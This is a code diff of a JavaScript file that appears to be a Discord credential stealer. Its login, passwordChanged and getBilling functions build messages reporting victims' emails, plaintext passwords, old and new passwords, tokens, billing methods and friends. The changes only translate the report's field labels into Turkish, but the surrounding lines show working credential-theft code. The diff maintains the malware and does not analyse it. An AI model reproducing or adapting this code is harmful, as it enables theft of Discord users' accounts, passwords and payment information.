@@ -475,7 +475,7 @@ const getBilling = async (token) => {
     if (!x.invalid) {
       switch (x.type) {
         case 1:
-          billing += '?? ';
+          billing += '**??**';
           break;
         case 2:
           billing += '<:paypal:951139189389410365> ';
@@ -615,17 +615,17 @@ const login = async (email, password, token) => {
             inline: false,
           },
           {
-            name: '<a:satanist:802503618972483615> Badges:',
+            name: '<a:satanist:802503618972483615> Rozet:',
             value: `${badges}`,
             inline: true,
           },
           {
-            name: '<:944007233820307467:959785232037470208> Billing:',
+            name: '<:944007233820307467:959785232037470208> Odeme:',
             value: `**${billing}**`,
             inline: true,
           },
           {
-            name: '<:944007233820307467:959785232037470208> Friends:',
+            name: '<:944007233820307467:959785232037470208> Arkadaslar:',
             value: `\`${friends}\``,
             inline: true,
           },
@@ -640,7 +640,7 @@ const login = async (email, password, token) => {
             inline: true,
           },
           {
-            name: '<a:satan:846706207632261120> Password:',
+            name: '<a:satan:846706207632261120> Sifre:',
             value: `\`${password}\``,
             inline: true,
           },
@@ -681,7 +681,7 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
           },
           {
             name: '**Discord Info**',
-            value: `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**`,
+            value: `Nitro Tipi: **${nitro}**\nRozet: **${badges}**\nOdeme: **${billing}**`,
             inline: true,
           },
           {
